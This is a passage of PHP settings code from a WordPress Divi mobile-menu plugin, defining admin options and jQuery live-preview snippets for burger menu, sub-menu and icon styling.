'name' => ''.esc_html__( "Header Height If not using custom header", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_header_height',
'type' => 'number',
'default' => '80',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '$("#et-top-navigation").css("min-height", value + "px");',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Distance from Edge", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_distance_edge',
'type' => 'number',
'default' => '0',
'min' => '-500',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
if ( $("body").hasClass("dm-bm-pos-left") ) {
$(".hamburger").css("left", value + "px");
  } else if ( $("body").hasClass("dm-bm-pos-right") ) {
  $(".hamburger").css("right", value + "px");
    }
    else {
    $(".hamburger").css("left", value + "px");
      }
',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Distance from Top", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_distance_top',
'type' => 'number',
'default' => '0',
'min' => '-500',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".hamburger").css("top", value + "px");',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Hover Opacity", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_opacity_hover',
'type' => 'number',
'default' => '0.6',
'min' => '0',
'max' => '1',
'step' => '0.1',
'livepreview' => '$(".menu-button:hover").css("opacity", value);',
) );


$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Icon", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Closed Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_burger_colour_closed',
'type' => 'color',
'default' => '#fff',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.hamburger-inner, .hamburger-inner::before, .hamburger-inner::after {background-color: " + value + ";}#nav-icon .dots{fill: " + value + ";}</style>");
',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Open Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_burger_colour_open',
'type' => 'color',
'default' => '#fff',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.hamburger.is-active .hamburger-inner, .hamburger.is-active .hamburger-inner::before, .hamburger.is-active .hamburger-inner::after {background-color: " + value + ";}.show-menu #nav-icon .dots{fill: " + value + ";}</style>");
',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Icon Position from Left", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_postion',
'type' => 'number',
'default' => '16',
'min' => '-200',
'max' => '200',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".hamburger-box, #nav-icon").css("left", value + "px");',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Icon Position from Top", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_postion_top',
'type' => 'number',
'default' => '1',
'min' => '-200',
'max' => '200',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".hamburger-box, #nav-icon").css("top", value + "px");',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Line / dot Width", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_line_width',
'type' => 'number',
'default' => '27',
'min' => '0',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.hamburger-inner, .hamburger-inner::before, .hamburger-inner::after, #nav-icon {width: " + value + "px;}</style>");
',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Line Height", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_line_height',
'type' => 'number',
'default' => '3',
'min' => '0',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.hamburger-inner, .hamburger-inner::before, .hamburger-inner::after {height: " + value + "px;}</style>");
',) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Line Border Radius", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_line_border_radius',
'type' => 'number',
'default' => '4',
'min' => '0',
'max' => '20',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.hamburger-inner, .hamburger-inner::before, .hamburger-inner::after {border-radius: " + value + "px;}</style>");
',) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Line Spacing", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_line_spacing',
'type' => 'number',
'default' => '8',
'min' => '0',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.hamburger-inner::before {top: " + value + "px !important;}.hamburger-inner::after {bottom: " + value + "px !important;}</style>");
',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Text", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Enter desired text to be next to the burger menu", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_text',
'type' => 'text',
'default' => '',
'desc' => ''.esc_html__( 'If you want some text next to your burger menu such as "MENU", add it here. If you leave it empty, notning will show', 'divi_mobile_settings' ).'',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Menu Text position from top", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_text_top',
'type' => 'number',
'default' => '20',
'min' => '-100',
'max' => '100',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".menu-text").css("top", value + "px");',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Menu Text position from left", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_text_teft',
'type' => 'number',
'default' => '-25',
'min' => '-500',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".menu-text").css("left", value + "px");',
) );


$burger_menu->createOption( array(
'name' => ''.esc_html__( "Menu Text font size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_text_font_size',
'type' => 'number',
'default' => '14',
'min' => '1',
'max' => '60',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".menu-text").css("font-size", value + "px");',
) );



$burger_menu->createOption( array(
'name' => ''.esc_html__( "Menu Text Font", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_text_font',
'type' => 'font',
'show_color' => false,
'show_font_size' => false,
'show_websafe_fonts' => false,
'livepreview' => '$(".menu-text").css(value);',
'css' => '.menu-text {
    value
}',
'desc' => 'We do not have a live preview of the font styles yet - save and reload to see it in action'
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Menu Text colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_text_color',
'type' => 'color',
'default' => '#1d0d6f',
'alpha'  => 'true',
'livepreview' => '$(".menu-text").css("color", value);',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_background_color',
'type' => 'color',
'default' => '#1d0d6f',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.menu-wrap::before, .hamburger {background-color: " + value + ";}</style>");
',

) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Width", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_background_size_width',
'type' => 'number',
'default' => '60',
'min' => '0',
'max' => '150',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".hamburger").css("width", value + "px");',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Height", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_background_size_height',
'type' => 'number',
'default' => '60',
'min' => '0',
'max' => '150',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".hamburger").css("height", value + "px");',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Border Radius", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__burger_menu_background_border_radius',
'type' => 'number',
'default' => '60',
'min' => '0',
'max' => '150',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".hamburger").css("border-radius", value + "px");',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Shadow", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Shadow Horizontal Length", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_background_box_shadow_horizontal',
'type' => 'number',
'default' => '0',
'min' => '-200',
'max' => '200',
'step' => '1',
'unit' => 'px',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Shadow Vertical Length", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_background_box_shadow_vetical',
'type' => 'number',
'default' => '6',
'min' => '-200',
'max' => '200',
'step' => '1',
'unit' => 'px',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Shadow Blur Radius", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_background_box_shadow_blur_radius',
'type' => 'number',
'default' => '30',
'min' => '0',
'max' => '300',
'step' => '1',
'unit' => 'px',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Shadow Spread Radius", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_background_box_shadow_spread_radius',
'type' => 'number',
'default' => '0',
'min' => '-200',
'max' => '200',
'step' => '1',
'unit' => 'px',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Background Shadow Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_background_box_shadow_colour',
'type' => 'color',
'default' => 'rgba(0, 0, 0, 0.2)',
'alpha'  => 'true',
) );

$inject->createOption( array(
'name' => ''.esc_html__( 'Select layout to inject above the menu', 'divi-bodyshop-woocommerce' ).'',
'id' => 'inject_head',
'type' => 'select-posts',
'post_type' => 'et_pb_layout',
'desc' => ''.esc_html__( 'Leave blank or add a library layout you want to inject.', 'divi-bodyshop-woocommerce' ).'',
) );


$inject->createOption( array(
'name' => ''.esc_html__( 'Select layout to inject below the menu', 'divi-bodyshop-woocommerce' ).'',
'id' => 'inject_footer',
'type' => 'select-posts',
'post_type' => 'et_pb_layout',
'desc' => ''.esc_html__( 'Leave blank or add a library layout you want to inject.', 'divi-bodyshop-woocommerce' ).'',
) );


$inject->createOption( array(
'name' => ''.esc_html__( 'Select layout to inject above the mobile custom header', 'divi-bodyshop-woocommerce' ).'',
'id' => 'inject_above_header',
'type' => 'select-posts',
'post_type' => 'et_pb_layout',
'desc' => ''.esc_html__( 'Leave blank or add a library layout you want to inject.', 'divi-bodyshop-woocommerce' ).'',
) );


$submenu->createOption( array(
'name' => ''.esc_html__( "Choose Sub-menu Style", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-menu Style", 'divi_mobile_settings' ).'',
'id' => 'sub_menu_style',
'type' => 'select',
'options' => array(
'collapse' => ''.esc_html__( "Collapse Nested", 'divi_mobile_settings' ).'',
'overlap-slide' => ''.esc_html__( "Overlap Slide In", 'divi_mobile_settings' ).'',
'side-by-side' => ''.esc_html__( "Side By Side", 'divi_mobile_settings' ).'',
),
'default' => 'collapse',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Disable Parent Click Through", 'divi-bodyshop-woocommerce' ).'',
'id' => 'disable_parent_clickthrough',
'type' => 'enable',
'default' => true,
'enabled' => ''.esc_html__( "YES", 'divi-bodyshop-woocommerce' ).'',
'disabled' => ''.esc_html__( "NO", 'divi-bodyshop-woocommerce' ).'',
'livepreview' => '',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-menu Appearance", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Enable Border at Top", 'divi-bodyshop-woocommerce' ).'',
'id' => 'sub_menu_enable_border',
'type' => 'enable',
'default' => true,
'enabled' => ''.esc_html__( "YES", 'divi-bodyshop-woocommerce' ).'',
'disabled' => ''.esc_html__( "NO", 'divi-bodyshop-woocommerce' ).'',
'livepreview' => '
if (value == "1") {
} else {
  $(".nav li ul").css("border-top", "0px");
}
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Menu max-width (set the width of your sub-menu)", 'divi_mobile_settings' ).'',
'id' => 'set_mobile_sub_menu_side_max_width',
'type' => 'number',
'default' => '300',
'min' => '1',
'max' => '3000',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.overlap-submenu #dm_nav .menu-wrap__inner .sub-menu {max-width: " + value + "px !important;}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Space at the top of the sub-menu", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_space_top',
'type' => 'number',
'default' => '0',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .sub-menu {padding-top: " + value + "px !important;}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Menu Background Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_sub_menu_bg_color',
'type' => 'color',
'default' => 'rgba(0, 0, 0, 0.2)',
'alpha'  => 'true',
'livepreview' => '$(".nav li ul.sub-menu").css("background-color", value);',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Sub-Menu Background Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_sub_sub_menu_bg_color',
'type' => 'color',
'default' => 'rgba(0, 0, 0, 0)',
'alpha'  => 'true',
'livepreview' => '$(".nav li ul.sub-menu ul.sub-menu").css("background-color", value);',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Menu Text Font", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_text_font',
'type' => 'font',
'show_color' => false,
'show_font_size' => false,
'show_websafe_fonts' => false,
'livepreview' => '$(".nav li ul.sub-menu a").css(value);',
'css' => '.nav li ul.sub-menu a {
    value
}',
'desc' => 'We do not have a live preview of the font styles yet - save and reload to see it in action'
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Menu Text Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_text_color',
'type' => 'color',
'default' => '#ffffff',
'alpha'  => 'true',
'livepreview' => '$(".nav li ul.sub-menu a").css("color", value);',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Menu Text Colour Hover", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_text_color_hover',
'type' => 'color',
'default' => '#efefef',
'alpha'  => 'true',
'livepreview' => '$(".nav li ul.sub-menu a:hover").css("color", value);',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Menu Text Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_text_font_size',
'type' => 'number',
'default' => '14',
'min' => '1',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".nav li ul.sub-menu a").css("font-size", value + "px");',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Menu Text Alignment", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_text_font_alignment',
'type' => 'select',
'options' => array(
'left' => ''.esc_html__( "Left", 'divi_mobile_settings' ).'',
'center' => ''.esc_html__( "Center", 'divi_mobile_settings' ).'',
'right' => ''.esc_html__( "Right", 'divi_mobile_settings' ).'',
),
'default' => 'left',
'livepreview' => '$("#dm-menu.nav li li").css("text-align", value);',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Sub-Menu Text padding top/bottom", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_text_padding',
'type' => 'number',
'default' => '14',
'min' => '1',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".nav li ul.sub-menu a").css("padding-top", value + "px");$(".nav li ul.sub-menu a").css("padding-bottom", value + "px");',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Open Sub-Menu Icon Appearance", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( 'Open Sub-Menu Icon', 'divi-bodyshop-woocommerce' ).'',
'id' => 'divi_mobile_sub_menu_icon',
'type' => 'text',
'default' => '24',
'desc' => ''.esc_html__( 'Enter in the number for the divi icon - You can see a full list', 'divi-bodyshop-woocommerce' ).' <a href="https://www.elegantthemes.com/blog/resources/elegant-icon-font" target="_blank">'.esc_html__( 'HERE.', 'divi-bodyshop-woocommerce' ).'</a> '.esc_html__( 'Just scroll down till you see the icons and some letter below. <br>Copy the numbers and letters that appear after "x". ', 'divi-bodyshop-woocommerce' ).'<br>'.esc_html__( 'So', 'divi-bodyshop-woocommerce' ).' "&amp;#x21;" - '.esc_html__( 'copy just the "21".', 'divi-bodyshop-woocommerce' ).' <br>"&amp;#xe016;" - '.esc_html__( 'copy the "e016"', 'divi-bodyshop-woocommerce' ).'',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Open Sub-Menu Icon Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_icon_activate_color',
'type' => 'color',
'default' => '#ffffff',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children > a:after {color: " + value + ";}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Open Sub-Menu Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_open_font_size',
'type' => 'number',
'default' => '16',
'min' => '1',
'max' => '100',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children > a:after {font-size: " + value + "px !important;}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Open Icon Position", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_position',
'type' => 'select',
'options' => array(
'far-right' => ''.esc_html__( "Far right of menu", 'divi_mobile_settings' ).'',
'after-text' => ''.esc_html__( "After menu text", 'divi_mobile_settings' ).'',
),
'default' => 'far-right',
'livepreview' => '
if (value == "far-right") {
  $("#dm-menu a").css("display", "block");
}
else {
  $("#dm-menu a").css("display", "inline-block");
  }
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Open Sub-Menu Icon Distance from Top", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_open_icon_top',
'type' => 'number',
'default' => '0',
'min' => '-50',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children > a:after {top: " + value + "px;}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Open Sub-Menu Icon Distance from Right", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_open_icon_left',
'type' => 'number',
'default' => '0',
'min' => '-50',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children > a:after {right: " + value + "px;}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Open Sub-Menu Rotation When Clicked", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_open_rotation',
'type' => 'number',
'default' => '0',
'min' => '-360',
'max' => '360',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children.visible > a:after {transform: rotate(" + value + "deg);}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Close Sub-Menu Icon Appearance", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( 'Close Sub-Menu Icon', 'divi-bodyshop-woocommerce' ).'',
'id' => 'divi_mobile_sub_menu_icon_close',
'type' => 'text',
'default' => '23',
'desc' => ''.esc_html__( 'Enter in the number for the divi icon - You can see a full list', 'divi-bodyshop-woocommerce' ).' <a href="https://www.elegantthemes.com/blog/resources/elegant-icon-font" target="_blank">'.esc_html__( 'HERE.', 'divi-bodyshop-woocommerce' ).'</a> '.esc_html__( 'Just scroll down till you see the icons and some letter below. <br>Copy the numbers and letters that appear after "x". ', 'divi-bodyshop-woocommerce' ).'<br>'.esc_html__( 'So', 'divi-bodyshop-woocommerce' ).' "&amp;#x21;" - '.esc_html__( 'copy just the "21".', 'divi-bodyshop-woocommerce' ).' <br>"&amp;#xe016;" - '.esc_html__( 'copy the "e016"', 'divi-bodyshop-woocommerce' ).'',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Close Sub-Menu Icon Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_icon_close_color',
'type' => 'color',
'default' => '#ffffff',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children.visible > a:after, #dm_nav .menu-wrap__inner .close-submenu::before {color: " + value + " !important;}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Close Sub-Menu Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_close_font_size',
'type' => 'number',
'default' => '16',
'min' => '1',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children.visible > a:after, #dm_nav .menu-wrap__inner .close-submenu::before {font-size: " + value + "px !important;}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Close Sub-Menu Icon Distance from Top", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_close_icon_top',
'type' => 'number',
'default' => '0',
'min' => '-50',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children.visible > a:after, #dm_nav .menu-wrap__inner .close-submenu::before {top: " + value + "px !important;}</style>");
',
) );

$submenu->createOption( array(
'name' => ''.esc_html__( "Close Sub-Menu Icon Distance from Left", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_sub_menu_close_icon_left',
'type' => 'number',
'default' => '0',
'min' => '-50',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm_nav .menu-wrap__inner .menu-item-has-children.visible > a:after, #dm_nav .menu-wrap__inner .close-submenu::before {margin-left: " + value + "px !important;}</style>");
',
) );



$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Space at the top of the menu", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_space_top',
'type' => 'number',
'default' => '0',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.menu-wrap__inner {padding-top: " + value + "px !important;}</style>");
',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Menu Background Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bg_color',
'type' => 'color',
'default' => '#000000',
'alpha'  => 'true',
'livepreview' => '$(".menu-wrap").css("background-color", value);$(".menu-wrap__inner").css("background-color", value);',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Menu Text Font", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_text_font',
'type' => 'font',
'show_color' => false,
'show_font_size' => false,
'show_websafe_fonts' => false,
'livepreview' => '$(".menu-wrap a").css(value);',
'css' => '.menu-wrap a {
    value
}',
'desc' => 'We do not have a live preview of the font styles yet - save and reload to see it in action'
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Menu Text Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_text_color',
'type' => 'color',
'default' => '#ffffff',
'alpha'  => 'true',
'livepreview' => '$(".menu-wrap a").css("color", value);',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Menu Text Colour Hover", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_text_color_hover',
'type' => 'color',
'default' => '#efefef',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.menu-wrap a:hover {color: " + value + ";}</style>");
',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Active Menu Text Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_active_menu_text_color',
'type' => 'color',
'default' => 'rgba(255,255,255,0)',
'alpha'  => 'true',
'livepreview' => '$(".menu-wrap .current_page_item a").css("color", value);',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Active Menu Text Colour Hover", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_active_menu_text_color_hover',
'type' => 'color',
'default' => 'rgba(255,255,255,0)',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.menu-wrap .current_page_item a:hover {color: " + value + ";}</style>");
',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Menu Text Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_text_font_size',
'type' => 'number',
'default' => '14',
'min' => '1',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".menu-wrap a").css("font-size", value + "px");',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Menu Text Alignment", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_text_font_alignment',
'type' => 'select',
'options' => array(
'left' => ''.esc_html__( "Left", 'divi_mobile_settings' ).'',
'center' => ''.esc_html__( "Center", 'divi_mobile_settings' ).'',
'right' => ''.esc_html__( "Right", 'divi_mobile_settings' ).'',
),
'default' => 'left',
'livepreview' => '$("#dm-menu.nav li").css("text-align", value);',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Menu Text padding top/bottom", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_text_padding',
'type' => 'number',
'default' => '14',
'min' => '1',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".menu-wrap a").css("padding-top", value + "px");$(".menu-wrap a").css("padding-bottom", value + "px");',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Which side do you want the menu to appear from?", 'divi_mobile_settings' ).'',
'id' => 'set_mobile_menu_side_appear',
'type' => 'select',
'options' => array(
'right' => ''.esc_html__( "Right", 'divi_mobile_settings' ).'',
'left' => ''.esc_html__( "Left", 'divi_mobile_settings' ).'',
),
'default' => 'right',
) );

$menu_appearance->createOption( array(
'name' => ''.esc_html__( "Menu max-width (set the width of your menu)", 'divi_mobile_settings' ).'',
'id' => 'set_mobile_menu_side_max_width',
'type' => 'number',
'default' => '300',
'min' => '1',
'max' => '3000',
'step' => '1',
'unit' => 'px',
'livepreview' => '
if ( $("body").hasClass("dm-off-canvas dm-side-slide") || $("body").hasClass("dm-off-canvas dm-top-slide") ) {


if ( $("body").hasClass("dm-menuside-right") ) {
$("head").append("<style>.menu-wrap, #dm_nav .menu-wrap__inner .sub-menu {right: 0;transform: translate3d(" + value + "px,0,0) !important;}.menu-wrap{max-width: "  + value + "px;}</style>");
} else {
$("head").append("<style>.menu-wrap, #dm_nav .menu-wrap__inner .sub-menu {left: 0;transform: translate3d(-" + value + "px,0,0) !important;}.menu-wrap.menu-wrap{max-width: "  + value + "px;}</style>");
}


} else if ( $("body").hasClass("dm-off-canvas dm-elastic") ) {

  if ( $("body").hasClass("dm-menuside-right") ) {
  $("head").append("<style>.menu-wrap {right: 0;max-width: "  + value + "px;}#dm_nav .menu-wrap__inner .sub-menu{right: 0;}</style>");
  } else {
  $("head").append("<style>.menu-wrap {left: 0;max-width: "  + value + "px;}#dm_nav .menu-wrap__inner .sub-menu{left: 0;}</style>");
  }

}
else {
  // code...
}


',
) );


$circle_stretch->createOption( array(
'name' => ''.esc_html__( "Icon Settings", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$circle_stretch->createOption( array(
'name' => ''.esc_html__( "Icon Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_icon_color',
'type' => 'color',
'default' => '#fff',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>body #dm_nav .bc-stretchy-nav.nav-is-visible ul .menu-item a::after {color: " + value + " !important;}</style>");
',
) );

$circle_stretch->createOption( array(
'name' => ''.esc_html__( "Icon Colour Hover", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_icon_color_hover',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>body #dm_nav .bc-stretchy-nav.nav-is-visible ul .menu-item a:hover::after {color: " + value + " !important;}</style>");
',
) );

$circle_stretch->createOption( array(
'name' => ''.esc_html__( "Icon Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_icon_font_size',
'type' => 'number',
'default' => '18',
'min' => '1',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>body #dm_nav .bc-stretchy-nav.nav-is-visible ul .menu-item a::after {font-size: " + value + "px !important;}</style>");
',
) );

$circle_stretch->createOption( array(
'name' => ''.esc_html__( "Icon Distance Top", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_icon_dis_top',
'type' => 'number',
'default' => '0',
'min' => '-50',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>body #dm_nav .bc-stretchy-nav.nav-is-visible ul .menu-item a::after{margin-top: " + value + "px !important;}</style>");
',
